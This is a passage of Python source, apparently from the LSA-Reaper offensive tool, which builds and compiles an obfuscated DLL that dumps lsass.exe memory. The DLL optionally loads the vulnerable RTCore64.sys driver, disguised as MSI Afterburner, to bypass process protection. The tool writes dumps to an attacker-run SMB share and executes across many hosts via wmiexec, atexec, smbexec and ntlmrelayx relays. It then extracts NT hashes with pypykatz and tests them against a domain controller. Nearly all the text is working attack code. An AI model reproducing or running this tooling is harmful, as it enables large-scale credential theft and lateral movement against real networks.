        dll_payload += '    system("copy %s:\\\\RTCore64.sys C:\\\\Windows\\\\Temp");\n' % (drive_letter)
        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(2000));\n'
        dll_payload += '    system("sc.exe create RTCore64 type=kernel start=auto binPath=C:\\\\Windows\\\\Temp\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"");\n'
        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(1000));\n'
        dll_payload += '    system("net start RTCore64");\n'
        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(3000));\n'
        dll_payload += '    HMODULE %s = LoadLibrary(TEXT("%s.dll"));\n' % (s1, runasppldllname)
        dll_payload += '    %s %s = (%s)GetProcAddress(%s, "freethecat");\n' % (runninit, sAbout, runninit, s1)
        dll_payload += '    %s(_getpid());\n' % (sAbout)
        dll_payload += '    FreeLibrary(%s);\n' % (s1)
    dll_payload += '    HANDLE %s;\n' % (hToken)
    dll_payload += '    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &%s);\n' % (hToken)
    dll_payload += '    TOKEN_PRIVILEGES %s;\n' % (tokenPriv)
    dll_payload += '    LUID %s;\n' % (luid)
    dll_payload += '    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &%s);\n' % (luid)
    dll_payload += '    %s.PrivilegeCount = 1;\n' % (tokenPriv)
    dll_payload += '    %s.Privileges[0].Luid = %s;\n' % (tokenPriv, luid)
    dll_payload += '    %s.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n' % (tokenPriv)
    dll_payload += '    AdjustTokenPrivileges(%s, FALSE, &%s, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);\n' % (hToken, tokenPriv)
    dll_payload += '\n'
    dll_payload += '    DWORD %s = 0;\n' % (lsassPID)
    dll_payload += '    HANDLE %s = NULL;\n' % (lsassHandle)
    dll_payload += '    HANDLE %s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n' % (snapshot)
    dll_payload += '    PROCESSENTRY32 %s = {};\n' % (processEntry)
    dll_payload += '    %s.dwSize = sizeof(PROCESSENTRY32);\n' % (processEntry)
    dll_payload += '    LPCWSTR %s = L"";\n' % (processName)
    dll_payload += '    string %s = "l";\n' % (l)
    dll_payload += '    string %s = "s";\n' % (s)
    dll_payload += '    string %s = "a";\n' % (a)
    dll_payload += '    string %s = "e";\n' % (e)
    dll_payload += '    string %s = "x";\n' % (x)
    dll_payload += '    string %s = ".";\n' % (period)
    dll_payload += '    string %s = %s + %s + %s +%s + %s + %s + %s + %s + %s;\n' % (lsass_processname, l, s, a, s, s, period, e, x, e)
    dll_payload += '    std::wstring %s(%s.begin(), %s.end());\n' % (processnamesd, lsass_processname, lsass_processname)
    dll_payload += '    const wchar_t* %s = %s.c_str();\n' % (szName, processnamesd)
    dll_payload += '    if (Process32First(%s, &%s)) {\n' % (snapshot, processEntry)
    dll_payload += '        while (_wcsicmp(%s, %s) != 0) {\n' % (processName, szName)
    dll_payload += '            Process32Next(%s, &%s);\n' % (snapshot, processEntry)
    dll_payload += '            %s = %s(%s.szExeFile);\n' % (processName, convertCharArrayToLPCWSTR, processEntry)
    dll_payload += '            %s = %s.th32ProcessID;\n' % (lsassPID, processEntry)
    dll_payload += '        }\n'
    dll_payload += '    }\n'
    dll_payload += ''
    dll_payload += '    %s = OpenProcess(PROCESS_ALL_ACCESS, 0, %s);\n' % (lsassHandle, lsassPID)
    dll_payload += ''
    # should go drive_letter:\\\\hostname-ip.dmp adding the -ip part would be too much work so im not doing it soz
    dll_payload += '    TCHAR %s[UNCLEN+1];\n' % (compname)
    dll_payload += '    DWORD %s=UNCLEN+1;\n' % (compname_len)
    dll_payload += '    GetComputerName((TCHAR*)%s,&%s);\n' % (compname, compname_len)

    dll_payload += '    char %s[200];\n' % (res)
    dll_payload += '    char *%s = "%s:\\\\";\n' % (one, drive_letter)
    dll_payload += '    char *%s = ".dmp";\n' % (twp)
    dll_payload += '    strcpy(%s, %s);\n' % (res, one)
    dll_payload += '    strcat(%s, %s);\n' % (res, compname)
    dll_payload += '    strcat(%s, %s);\n' % (res, twp)

    dll_payload += '    HANDLE %s = CreateFile(%s, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n' % (outFile, res)
    dll_payload += ''
    dll_payload += '    %s();\n' % (load_RtlCreateProcessReflection)
    dll_payload += '    t_refl_args %s = { 0 };\n' % (args)
    dll_payload += '    %s.orig_hndl = %s;\n' % (args, lsassHandle)
    dll_payload += '    DWORD %s = %s(&%s);\n' % (ret, refl_creator, args)
    dll_payload += ''

    dll_payload += '    DWORD %s = MiniDumpWriteDump(%s.returned_hndl, %s.returned_pid, %s, MiniDumpWithFullMemory, NULL,  NULL, NULL);\n' % (retd, args, args, outFile)
    dll_payload += ''
    dll_payload += '    CloseHandle(%s);\n' % (outFile)
    dll_payload += '    TerminateProcess(%s.returned_hndl, 0);\n' % (args)
    dll_payload += '    CloseHandle(%s.returned_hndl);\n' % (args)
    dll_payload += '\n'
    dll_payload += '}\n'
    dll_payload += ''
    dll_payload += 'int main(){\n'
    dll_payload += '    return 1;\n'
    dll_payload += '}\n'

    # share_name, payload_name, addresses_array, drive_letter
    with open('/var/tmp/{}/pl.cpp'.format(share_name), 'w') as f:
        f.write(dll_payload)
        f.close()

    if runasppl:
        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, runasppldllname))
        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
        with open('/var/tmp/{}/cleanup.bat'.format(share_name), 'w') as f:
            f.write('net stop RTCore64\n')
            f.write('sc delete RTCore64\n')
            f.write(r'del C:\Windows\Temp\RTCore64.sys')
            f.close()

        os.system('sudo chmod uog+rwx /var/tmp/{}/{}.dll'.format(share_name, runasppldllname))
        os.system('sudo chmod uog+rwx /var/tmp/{}/RTCore64.sys'.format(share_name))
        os.system('sudo chmod uog+rwx /var/tmp/{}/cleanup.bat'.format(share_name))

    # copy calc.exe to our smb share
    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
    # allow anyone to run calc.exe
    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))

    os.system('sudo x86_64-w64-mingw32-g++ /var/tmp/{}/pl.cpp -fpermissive -Wwrite-strings -w -I {}/src/ -static -shared -o /var/tmp/{}/WindowsCodecs.dll -ldbghelp -lpsapi'.format(share_name, cwd, share_name, payload_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))

def setup_share():
    if options.sharename is None:
        share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
    else:
        share_name = options.sharename

    if options.shareuser is None:
        share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        share_user = options.shareuser

    if options.sharepassword is None:
        share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
    else:
        share_pass = options.sharepassword

    if options.payloadname is None:
        payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        payload_name = options.payloadname

    if options.sharegroup is None:
        share_group = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        share_group = options.sharegroup

    printnlog('\n[Generating share]')
    # making the directory
    printnlog('{} Creating the share folder'.format(green_plus))
    os.system('sudo mkdir /var/tmp/' + share_name)

    # smb.conf edits
    data = """[{}]
    path = /var/tmp/{}
    public = no
    force user = {}
    force group = {}
    browseable = yes
    create mask = 0664
    force create mode = 0664
    directory mask = 0775
    force directory mode = 0775
    read only = no
    comment = The share
    """.format(share_name, share_name, share_user, share_group)

    # copy old smb.conf file so its safe
    printnlog('{} Backing up the smb.conf file'.format(green_plus))
    os.system('sudo cp /etc/samba/smb.conf ' + cwd + "/")
    printnlog('{} Making modifications'.format(green_plus))
    with open('/etc/samba/smb.conf', 'a') as f:
        f.write(data)
        f.close()

    # create the user for the share
    # generate the group
    printnlog('{} Creating the group: {}'.format(green_plus, share_group))
    os.system('sudo groupadd --system ' + share_group)
    # make the user
    printnlog('{} Creating the user: {}'.format(green_plus, share_user))
    os.system('sudo useradd --system --no-create-home --group ' + share_group + " -s /bin/false " + share_user)
    # give the user access to the share folder
    printnlog('{} Giving the user rights'.format(green_plus))
    os.system('sudo chown -R ' + share_user + ":" + share_group + " /var/tmp/" + share_name)
    # expand access to the group
    printnlog('{} Giving the group rights'.format(green_plus))
    os.system('sudo chmod -R g+w /var/tmp/' + share_name)
    # create the smbusers password
    printnlog('{} Editing the SMB password'.format(green_plus))
    proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
    proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
    # restart the smb service
    printnlog('{}[+]{} Restarting the SMB service'.format(color_BLU, color_reset))
    os.system('sudo service smbd restart')

    return share_name, share_user, share_pass, payload_name, share_group

def auto_parse():
    printnlog('\n[parsing files]\n')
    os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(options.loot_dir, timestamp, options.loot_dir, timestamp))
    os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(options.loot_dir, timestamp, options.loot_dir, timestamp))
    os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep --text 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'IIS APPPOOL\|NT AUTHORITY\|Window Manage\|Font Driver Host\|\$\|::\|a00000000000' >> {}/loot/{}/dumped_msv.txt".format(options.loot_dir, timestamp, options.loot_dir, timestamp, options.loot_dir, timestamp))

    remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
    if remove_files.lower() == 'y':
        os.system('sudo rm {}/loot/{}/*.dmp'.format(options.loot_dir, timestamp))

    if options.av:
        printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
        try:
            with open('{}/loot/{}/dumped_msv.txt'.format(options.loot_dir, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
                msv_creds = f.readlines()
                f.close()
        except BaseException as e:
            printnlog('\n{}[!]{} There was an error reading the dumped_msv.txt file'.format(color_RED, color_reset))
        else:
            msv_creds_cleaned = []
            for cred in msv_creds:  # here we are going to remove any \r\n and any items that are missing a username
                cred = cred.replace('\n', '')
                cred = cred.replace('\r', '')
                if cred.find('::') == -1 and cred.find('Domain:Username:NT:LM') == -1:
                    msv_creds_cleaned.append(cred)
            if len(msv_creds_cleaned) > 0:
                ip_to_check_against = input('\nEnter an IP to check the accounts against (Preferably a domain controller): ')
                try:  # prevent the user from giving a non ip
                    ipaddress.ip_address(ip_to_check_against)
                except ValueError as e:
                    ip_to_check_against = addresses[0]

                printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
                tried_full = []
                for item in msv_creds_cleaned:
                    try:
                        if item not in tried_full:  # this prevents duplicate attempts
                            idx_of_2nd_colon = item.find(":", item.find(":") + 1)
                            username = item[item.find(":") + 1:idx_of_2nd_colon]
                            nthash = item[idx_of_2nd_colon + 1:-1]
                            if acct_chk_fail.count(username) <= 3:  # antilockout check
                                if username not in acct_chk_valid:  # why try again if we already found a valid set
                                    check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
                                    tried_full.append(item)
                                else:
                                    printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
                            else:
                                printnlog('{}[!]{} Skipping {}:{} to prevent lockout'.format(color_BLU, color_reset, username, nthash))
                        else:
                            printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
                    except Exception as e:
                        printnlog('Cred check error: {}'.format(str(e)))
                printnlog("")
            else:
                printnlog('{} There are no creds to check'.format(red_minus))

def alt_exec_exit():
    try:  # move the share file to the loot dir
        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))
    except BaseException as e:
        pass

    dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(options.loot_dir, timestamp))  # gets a list of all the .dmp file names within the output dir
    dumped_hosts_fin = []
    for item in dumped_hosts:
        dumped_hosts_fin.append(item[item.rfind('/') + 1:item.rfind('.')])  # this substring should make the filename hostname-ip only
    with open('{}/loot/{}/dumped_hosts.txt'.format(options.loot_dir, timestamp), 'w') as f:  # writes the list to a file
        for host in dumped_hosts_fin:
            f.write(host + '\n')
        f.close()

    if options.ap:  # autoparse
        auto_parse()
    printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, options.loot_dir, timestamp, color_reset))

    printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    try:
        os.system('sudo service smbd stop')
        printnlog(green_plus + ' Stopped the smbd service')
    except BaseException as e:
        pass

    try:
        os.system('sudo cp ' + cwd + "/smb.conf /etc/samba/smb.conf")
        printnlog(green_plus + ' Cleaned up the smb.conf file')
    except BaseException as e:
        pass

    try:
        os.system('sudo rm ' + cwd + '/smb.conf')
    except BaseException as e:
        pass

    try:
        os.system('sudo userdel ' + share_user)
        printnlog(green_plus + ' Removed the user: ' + share_user)
    except BaseException as e:
        pass

    try:
        os.system('sudo groupdel ' + share_group)
        printnlog(green_plus + ' Removed the group: ' + share_group)
    except BaseException as e:
        pass

    try:
        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
    except BaseException as e:
        pass

    print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
    sys.exit(0)


def config_check(thread1):
    fail = 0
    sockfail = 0
    printnlog('{}[{}Checking proxychains config{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
    # this will get the location of the config file proxychains is using
    proc = subprocess.run(['proxychains -h'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    dat = proc.stderr.decode().split('\n')

    for line in dat:
        if line.find('config file found') != -1:
            config_file = line[line.find(':') + 2:]

    try:
        with open(config_file, 'r') as f:
            dat = f.read()
            f.close()

        if dat.find('127.0.0.1 1080') == -1:
            sockfail += 1

    except FileNotFoundError as e:
        fail += 1

    if fail == 1:
        printnlog('{} ERROR you are missing proxychains config'.format(red_minus))
        os.system('touch {}/exit'.format(cwd))
        thread1.join()
        alt_exec_exit()

    if sockfail >= 1:
        printnlog('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains config'.format(red_minus))
        os.system('touch {}/exit'.format(cwd))
        thread1.join()
        alt_exec_exit()

    printnlog('\n{}[{}Config looks good{}]{}\n'.format(color_BLU, color_reset, color_BLU, color_reset))

def get_size(path):
    size = os.path.getsize(path)
    if size < 1000:
        return f"{size} bytes"
    elif size < pow(1000, 2):
        return f"{round(size / 1000, 2)} KB"
    elif size < pow(1000, 3):
        return f"{round(size / (pow(1000, 2)), 2)} MB"
    elif size < pow(1000, 4):
        return f"{round(size / (pow(1000, 3)), 2)} GB"

def alt_exec_newfile_printer(): # im aware of the issue with getting the loop to exit at the end of the run youll just have to deal with pressing ctrl c
    file_arr_hist = []
    try:
        while True:
            file_arr = glob.glob('/var/tmp/{}/*.dmp'.format(share_name))
            for file in file_arr:
                orig_file = file
                file = file[file.rfind('/')+1:]
                if file not in file_arr_hist:
                    file_arr_hist.append(file)
                    printnlog('{}[+]{} New DMP file {} Size: {}'.format(color_BLU, color_reset, file, get_size(orig_file)))
            time.sleep(3)
            if os.path.isfile('{}/exit'.format(cwd)):
                os.system('sudo rm {}/exit'.format(cwd))
                break

    except KeyboardInterrupt:
        pass

def relayx_dump_mt_execute(reaper_command, relayx_dat):
    printnlog('{}[+]{} Attacking {} as {}'.format(color_BLU, color_reset, relayx_dat[1], relayx_dat[2]))

    if logging.getLogger().level == logging.DEBUG:  # if debug is enabled print the command else just log it
        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
    else:
        lognoprint('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
    # run the command
    data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
    retries = 0
    while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
        data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
        if retries >= 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
            printnlog('{}[!]{} {}: Max Retries hit, skipping'.format(color_YELL, color_reset, relayx_dat[1]))
            break
        else:
            retries += 1
    if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
        printnlog('DATA_OUT7: {}'.format(data_out))
    else:  # otherwise just log it to the outputfile
        lognoprint('DATA_OUT8: {}'.format(data_out))

    printnlog('{}[+]{} {}: Completed'.format(color_BLU, color_reset, relayx_dat[1]))

    if data_out.find('STATUS_ACCESS_DENIED') == -1 and data_out.find('STATUS_LOGON_TYPE_NOT_GRANTED') == -1 and data_out.find('Connection refused') == -1 and retries < 12 and data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') == -1:  # make sure it ran right before adding it to dumped ips
        with open('{}/hist'.format(cwd), 'a') as f:  # keep a log of what ips have been dumped
            f.write(str(relayx_dat[1]) + '\n')
            f.close()

def relayx_dump(reaper_command):
    headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
    url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
    dumped_ips = []
    try:
        proxy_handler = ProxyHandler({})
        opener = build_opener(proxy_handler)
        response = Request(url)
        r = opener.open(response)
        result = r.read()

        items = json.loads(result)
    except Exception as e:
        printnlog("ERROR: %s" % str(e))
        if str(e).find('Connection refused') != -1:
            printnlog('It appears that ntlmrelayx is not running its api on port 9090 try running it with -socks')
    else:
        if os.path.isfile('{}/hist'.format(cwd)): # get the hosts we have dumped before
            with open('{}/hist'.format(cwd), 'r') as f:
                ips = f.read()
                dumped_ips = ips.split('\n')
        if len(items) > 0:
            tmp = result.decode()
            tmp = tmp.replace('[', '')
            tmp = tmp.replace('"', '')
            tmp = tmp.replace('\n', '')
            tmp = tmp.split('],')

            # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
            uniq = []
            uniq_ips = []
            for thing in tmp: # this will uniq the items returned from ntlmrelayx that are admin status true
                dat = thing.replace(']', '').split(',')
                if dat[1] not in uniq_ips and dat[3] == 'TRUE':
                    uniq.append(thing)
                    uniq_ips.append(dat[1])

            with ProcessPool(max_workers=options.threads) as thread_exe:
                for item in uniq:
                    relayx_dat = item.replace(']', '').split(',')
                    if relayx_dat[3] == 'TRUE':
                        if relayx_dat[1] not in dumped_ips: # make sure we dont dump ips we have already dumped
                            try:
                                out = thread_exe.schedule(relayx_dump_mt_execute, (reaper_command, relayx_dat,), timeout=options.timeout)
                            except Exception as e:
                                if logging.getLogger().level == logging.DEBUG:
                                    import traceback

                                    traceback.print_exc()
                                lognoprint(str(e) + '\n')
                                logging.error(str(e))
                                continue
                            except KeyboardInterrupt as e:
                                continue
                        else:
                            printnlog('{} {} is in hist file. Skipping...' .format(yellow_minus, relayx_dat[1]))

            time.sleep(2)
        else:
            printnlog('No Relays Available!')

def alt_exec(relayx, reaper_command):
    thread1 = threading.Thread(target=alt_exec_newfile_printer) # starts our thread to print new files
    thread1.start()

    if relayx:
        printnlog('{} Executing {} via ntlmrelayx smbexec\n'.format(gold_plus, options.payload))
        if os.path.isfile('{}/smbexec-shellless.py'.format(cwd)) == False:
            printnlog('{} ERROR Missing smbexec-shellless.py in {}/'.format(red_minus, cwd))
            os.system('touch {}/exit'.format(cwd))
            thread1.join()
            alt_exec_exit()
        config_check(thread1)
        relayx_dump(reaper_command)
        os.system('touch {}/exit'.format(cwd))
        thread1.join()
        alt_exec_exit()

    yes = input('Press enter to exit \n')
    os.system('touch {}/exit'.format(cwd))
    thread1.join()
    alt_exec_exit()


def exec_wmic(ip, domain):
    try:
        if options.method == 'wmiexec':
            executer = WMIEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.share,
                               False, options.k, options.dc_ip, 'cmd')
            executer.run(ip, False)
        elif options.method == 'smbexec':
            executer = CMDEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                               'C$', 445, options.service_name, 'cmd')
            executer.run(ip, ip)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        lognoprint('{}: {}\n'.format(ip, str(e)))


def auto_drive(addresses, domain):  # really helpful so you dont have to know which drive letter to use
    printnlog('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
    failed_logons = 0

    if len(addresses) > 2 and options.localauth == False:  # Anti lockout check
        for x in range(2):
            try:
                if options.method == 'wmiexec':
                    executer = WMIEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.share,
                                       False, options.k, options.dc_ip, 'cmd')
                    executer.run(addresses[x], False)
                elif options.method == 'smbexec':
                    executer = CMDEXEC('wmic logicaldisk get caption ', username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                                       'C$', 445, options.service_name, 'cmd')
                    executer.run(addresses[x], addresses[x])

            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                lognoprint('{}: {}\n'.format(addresses[x], str(e)))

                if str(e).find('STATUS_LOGON_FAILURE') != -1 and options.localauth == False:  # way to track failed logins to see if they're gonna lock the account out
                    logging.error('{}: {}'.format(addresses[x], str(e)))
                    failed_logons += 1

                if failed_logons >= 2 and options.localauth == False:
                    cont = input('{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(color_YELL, color_reset, failed_logons))
                    if cont.lower() == 'n':
                        printnlog("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
                        try:
                            os.system('sudo service smbd stop')
                            printnlog(green_plus + ' Stopped the smbd service')
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo cp ' + cwd + '{}/smb.conf /etc/samba/smb.conf')
                            printnlog(green_plus + ' Cleaned up the smb.conf file')
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo rm ' + cwd + '/smb.conf')
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo userdel ' + share_user)
                            printnlog(green_plus + ' Removed the user: ' + share_user)
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo groupdel ' + share_group)
                            printnlog(green_plus + ' Removed the group: ' + share_group)
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))
                            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, options.loot_dir, timestamp, color_reset))
                        except BaseException as e:
                            pass

                        try:
                            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
                        except BaseException as e:
                            pass

                        print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
                        sys.exit(0)
                continue
            # end of antilocout check

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # incase they run with localauth to prevent file not found err
        os.system('sudo rm {}/drives.txt'.format(cwd))
    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
        for ip in addresses:
            if options.localauth:
                domain = ip
            try:
                out = thread_exe.schedule(exec_wmic, (ip, domain,), timeout=25)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                lognoprint(str(e) + '\n')
                logging.error(str(e))
                continue
            except KeyboardInterrupt as e:
                continue
    outdata = []
    try:
        data = ''  # read data that was saved to drives.txt into data
        with open('{}/drives.txt'.format(cwd), 'r') as f:
            data = f.read()
            f.close()
        outdata = re.findall('[A-Z]', data)  # rip out all the A: C: drive letters

    except BaseException as e:
        pass

    inuse_driveletters = []
    for letter in outdata:
        if letter not in inuse_driveletters:
            inuse_driveletters.append(letter)

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    for item in list(map(chr, range(ord('A'), ord('Z') + 1))):
        if item not in inuse_driveletters and item != 'C' and item != 'D':
            return item

    least_common = collections.Counter(inuse_driveletters).most_common()[-1][0]
    printnlog('{}[!]{} Between every machine all drive letters are in use'.format(color_YELL, color_reset))
    printnlog('{}[*]{} The least used drive letter is {}: it is available on {}/{} machines\n'.format(color_BLU, color_reset, least_common[0], (len(addresses) - least_common[1]), len(addresses)))

    yn = input('Would you like to use {}: as the drive letter if not we exit ps. the program will hang on the machines that have the drive mounted (y/N) '.format(least_common[0]))
    if yn.lower() == 'y':
        return least_common[0]
    else:
        sys.exit(0)


def mt_execute(ip, count):  # multithreading requires a function
    printnlog('{} Attacking {}'.format(green_plus, ip))
    try:
        if options.method == 'wmiexec':
            executer = WMIEXEC(command, username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
            executer.run(ip, False)
        elif options.method == 'atexec':
            atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, command, None, False)
            atsvc_exec.play(ip)
        elif options.method == 'smbexec':
            executer = CMDEXEC(command, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                               options.share, 445, options.service_name, 'cmd')
            executer.run(ip, ip)
        printnlog("{} {}: Completed".format(green_plus, ip))
        if count % options.threads == 0:
            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count / len(addresses)) * 100, 2))))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        lognoprint('{}: {}\n'.format(ip, str(e)))
        logging.error('{}: {}'.format(ip, str(e)))
        if count % options.threads == 0:
            printnlog('{}[+]{} {}% Complete'.format(color_YELL, color_reset, str(round((count / len(addresses)) * 100, 2))))
        pass


def port445_check(interface_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((interface_ip, 445))
    except socket.error as e:
        if e.errno == errno.EADDRINUSE:
            printnlog('{} Port 445 is already in use\nTry running "sudo netstat -plnt | grep 445" or "sudo ss -plnt | grep 445" to see active listening ports'.format(red_minus))
            sys.exit(0)
        else:
            # something else raised the socket.error exception
            printnlog(str(e))

    sock.close()


def update_chk():
    try:
        printnlog('{}Checking for updates{}'.format(color_YELL, color_reset))
        req = requests.get('https://raw.githubusercontent.com/samiam1086/LSA-Reaper/main/lsa-reaper.py', timeout=5)
        reqhash = hashlib.sha256(req.content).hexdigest()

        with open(__file__, 'rb') as f:
            dat = f.read()
            f.close
        localhash = hashlib.sha256(dat).hexdigest()

        if localhash != reqhash:
            printnlog('{}WARNING Your LSA-Reaper is out of date{}\n'.format(color_YELL, color_reset))
    except KeyboardInterrupt as e:
        printnlog('{}Ctrl C detected skipping{}'.format(color_YELL, color_reset))
        pass
    except:
        printnlog('{}Unable to check for updates{}\n'.format(color_YELL, color_reset))
        pass

def apt_package_chk(payload):
    errors = False
    cache = apt.Cache()
    try:
        if cache['samba'].is_installed:
            pass
        else:
            printnlog(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
            errors = True
    except ValueError:
        printnlog(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
        errors = True

    try:
        if cache['mono-complete'].is_installed:
            pass
        else:
            printnlog(color_RED + '[!] ERROR: mono-complete is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
            errors = True
    except ValueError:
        printnlog(color_RED + '[!] ERROR: mono-complete is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
        errors = True
    if payload == 'exe-rtlcp':
        try:
            if cache['mingw-w64'].is_installed:
                pass
            else:
                printnlog(color_RED + '[!] ERROR: mingw-w64 is not installed and is required for exe-rtlcp' + color_reset + '\n please install the dependecy with sudo apt-get install mingw-w64 -y')
                errors = True
        except ValueError:
            printnlog(color_RED + '[!] ERROR: mingw-w64 is not installed and is required for exe-rtlcp' + color_reset + '\n please install the dependecy with sudo apt-get install mingw-w64 -y')
            errors = True

    if errors:
        sys.exit(1)

# Process command-line arguments.
if __name__ == '__main__':
    # quick checks to see if were good
    if sys.platform != 'linux':
        print('[!] This program is Linux only')
        sys.exit(1)

    if os.geteuid() != 0:
        print('[!] Must be run as sudo')
        sys.exit(1)

    if os.path.isfile('{}/exit'.format(cwd)):
        os.system('sudo rm {}/exit'.format(cwd))


    if os.path.isfile('{}/indivlog.txt'.format(cwd)):
        os.system('sudo rm {}/indivlog.txt'.format(cwd))

    lognoprint('\n{}{}{}\n'.format(color_PURP, timestamp, color_reset))

    printnlog(reaper_banner)
    if '-sku' not in sys.argv:
        update_chk()

    printnlog(version.BANNER)

